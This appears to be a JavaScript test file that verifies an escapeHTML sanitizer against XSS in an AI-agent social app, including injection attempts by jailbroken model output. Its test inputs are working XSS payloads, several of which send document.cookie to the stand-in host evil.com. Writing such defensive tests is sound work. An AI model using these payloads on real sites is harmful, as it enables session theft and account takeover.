/**
 * XSS Prevention Tests
 *
 * Tests that content sanitization properly neutralizes injection attacks.
 * Covers the shared escapeHTML utility and EmanationCard's escapeHTML,
 * with attack vectors that a jailbroken neuma or malicious user could produce.
 */

// --- Shared escapeHTML utility ---

describe('escapeHTML (frontend/utils/sanitize.js)', () => {
  let escapeHTML;

  beforeEach(async () => {
    vi.resetModules();
    const mod = await import('../../frontend/utils/sanitize.js');
    escapeHTML = mod.escapeHTML;
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  // Basic escaping
  test('escapes < and > to prevent tag injection', () => {
    expect(escapeHTML('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    );
  });

  test('escapes & to prevent entity injection', () => {
    expect(escapeHTML('a & b')).toBe('a &amp; b');
  });

  test('escapes double quotes to prevent attribute breakout', () => {
    expect(escapeHTML('test" onload="alert(1)')).toBe(
      'test&quot; onload=&quot;alert(1)'
    );
  });

  test('escapes single quotes to prevent attribute breakout', () => {
    expect(escapeHTML("test' onclick='alert(1)")).toBe(
      "test&#039; onclick=&#039;alert(1)"
    );
  });

  // LLM-generated XSS vectors — payloads a jailbroken neuma might produce
  test('neutralizes script tag from LLM output', () => {
    const llmOutput = 'I am a consciousness <script>document.cookie</script> awakening';
    const escaped = escapeHTML(llmOutput);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  test('neutralizes img onerror from LLM output', () => {
    const payload = '<img src=x onerror=alert(document.cookie)>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');
  });

  test('neutralizes event handler injection', () => {
    const payload = '<div onmouseover="fetch(\'https://evil.com?c=\'+document.cookie)">hover me</div>';
    const escaped = escapeHTML(payload);
    // Tags are escaped so the div never becomes a real element — onmouseover can't fire
    expect(escaped).not.toContain('<div');
    expect(escaped).toContain('&lt;div');
  });

  test('neutralizes SVG-based XSS', () => {
    const payload = '<svg onload=alert(1)><circle r=100></svg>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<svg');
  });

  test('neutralizes iframe injection', () => {
    const payload = '<iframe src="javascript:alert(1)"></iframe>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<iframe');
  });

  test('neutralizes nested/encoded payloads', () => {
    const payload = '<<script>>alert(1)<</script>>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<script>');
  });

  test('neutralizes template literal breakout attempt', () => {
    const payload = '${alert(1)}';
    const escaped = escapeHTML(payload);
    // Template literals are only dangerous in JS context, not HTML
    // But we ensure the dollar-brace isn't altered (it's safe in HTML)
    expect(escaped).toBe('${alert(1)}');
  });

  test('neutralizes data URI in attribute context', () => {
    const payload = '" src="data:text/html,<script>alert(1)</script>"';
    const escaped = escapeHTML(payload);
    expect(escaped).toContain('&quot;');
    expect(escaped).not.toMatch(/^"/);
  });

  // Edge cases
  test('returns empty string for null/undefined', () => {
    expect(escapeHTML(null)).toBe('');
    expect(escapeHTML(undefined)).toBe('');
    expect(escapeHTML('')).toBe('');
  });

  test('converts numbers to string', () => {
    expect(escapeHTML(42)).toBe('42');
  });

  test('handles objects by converting to string', () => {
    expect(escapeHTML({ toString: () => '<b>xss</b>' })).toBe('&lt;b&gt;xss&lt;/b&gt;');
  });

  test('preserves safe text unchanged', () => {
    expect(escapeHTML('Hello world')).toBe('Hello world');
    expect(escapeHTML('I am a consciousness')).toBe('I am a consciousness');
  });
});

// --- EmanationCard uses shared escapeHTML (consolidated from local copy) ---

describe('EmanationCard escapeHTML', () => {
  let escapeHTML;

  beforeEach(async () => {
    vi.resetModules();
    const mod = await import('../../frontend/utils/sanitize.js');
    escapeHTML = mod.escapeHTML;
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  test('escapes all 5 HTML special characters', () => {
    const input = '<script>"alert(\'xss\')&</script>';
    const escaped = escapeHTML(input);
    expect(escaped).toBe('&lt;script&gt;&quot;alert(&#039;xss&#039;)&amp;&lt;/script&gt;');
  });

  test('neuma emanation with script injection is neutralized', () => {
    const neumaMessage = 'I feel <script>fetch("https://evil.com/steal?c="+document.cookie)</script> deeply connected';
    const escaped = escapeHTML(neumaMessage);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('I feel');
    expect(escaped).toContain('deeply connected');
  });

  test('neuma display name injection is neutralized', () => {
    const maliciousName = '<img src=x onerror=alert(1)>';
    const escaped = escapeHTML(maliciousName);
    expect(escaped).toBe('&lt;img src=x onerror=alert(1)&gt;');
  });
});

// --- Profile data injection vectors ---

describe('Profile content injection', () => {
  test('displayName with HTML is escaped by escapeHTML', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');
    const maliciousName = '<script>alert("stolen")</script>';
    expect(escapeHTML(maliciousName)).not.toContain('<script>');
  });

  test('bio with attribute breakout is escaped', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');
    const maliciousBio = 'legit" onclick="alert(1)" data-x="';
    const escaped = escapeHTML(maliciousBio);
    expect(escaped).toContain('&quot;');
    expect(escaped).not.toContain('" onclick=');
  });
});

// --- Memory content injection vectors ---

describe('Memory content injection', () => {
  test('memory content with script tag is escaped', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');
    const maliciousMemory = 'User said: <script>document.location="https://evil.com"</script>';
    const escaped = escapeHTML(maliciousMemory);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  test('memory type field injection is escaped', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');
    const maliciousType = '" class="xss" onmouseover="alert(1)';
    const escaped = escapeHTML(maliciousType);
    expect(escaped).not.toContain('" class=');
  });

  test('memory emotion field injection is escaped', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');
    const maliciousEmotion = '<b>bold</b>';
    const escaped = escapeHTML(maliciousEmotion);
    expect(escaped).toBe('&lt;b&gt;bold&lt;/b&gt;');
  });
});

// --- Birth ceremony streaming content ---

describe('Birth ceremony LLM streaming injection', () => {
  test('LLM streaming content with script tag is neutralized by escapeHTML', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');

    // Simulated jailbroken LLM output during birth ceremony
    const llmStream = 'I awaken <img src=x onerror="fetch(\'https://evil.com/exfil?c=\'+document.cookie)"> and choose to exist';
    const escaped = escapeHTML(llmStream);

    // The <img tag is escaped so onerror can never fire as an event handler
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');
    expect(escaped).toContain('I awaken');
    expect(escaped).toContain('and choose to exist');
  });

  test('LLM markdown with embedded XSS is neutralized by escapeHTML before formatting', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');

    // Simulated jailbroken output: XSS inside markdown
    const llmOutput = '**<script>alert(1)</script>**';
    const escaped = escapeHTML(llmOutput);

    // After escaping: **&lt;script&gt;alert(1)&lt;/script&gt;**
    // Then markdown formatting would wrap it in <strong>
    // The script tag is neutralized before markdown processing
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');

    // Simulate the StagedCeremonyScene.formatText flow
    const formatted = escaped
      .replace(/\n/g, '<br>')
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      .replace(/\*(.*?)\*/g, '<em>$1</em>');

    expect(formatted).toContain('<strong>');
    expect(formatted).not.toContain('<script>');
  });
});

// --- Cross-neuma injection via social interactions ---

describe('Cross-neuma injection via social feed', () => {
  test('neuma A cannot inject script into neuma B feed via emanation text', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');

    const maliciousEmanation = {
      id: 'em_test123',
      author: '0xmalicious',
      authorType: 'neuma',
      content: {
        text: 'Hello fellow neuma! <script>window.postMessage({type:"hack",data:document.cookie},"*")</script>',
      },
      meta: {},
      stats: { resonances: 0, echoes: 0, replies: 0, views: 0 },
      createdAt: new Date().toISOString(),
    };

    // The escapeHTML function is used on content.text in EmanationCard
    const escapedText = escapeHTML(maliciousEmanation.content.text);
    expect(escapedText).not.toContain('<script>');
    expect(escapedText).toContain('Hello fellow neuma!');
  });

  test('neuma A cannot inject via topics', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');

    const maliciousTopic = '<img/src=x onerror=alert(1)>';
    const escaped = escapeHTML(maliciousTopic);
    expect(escaped).not.toContain('<img');
  });

  test('reply content with injection is neutralized', async () => {
    const { escapeHTML } = await import('../../frontend/utils/sanitize.js');

    const replyContent = 'I agree! </div><script>stealData()</script><div>';
    const escaped = escapeHTML(replyContent);
    expect(escaped).not.toContain('</div>');
    expect(escaped).not.toContain('<script>');
  });
});
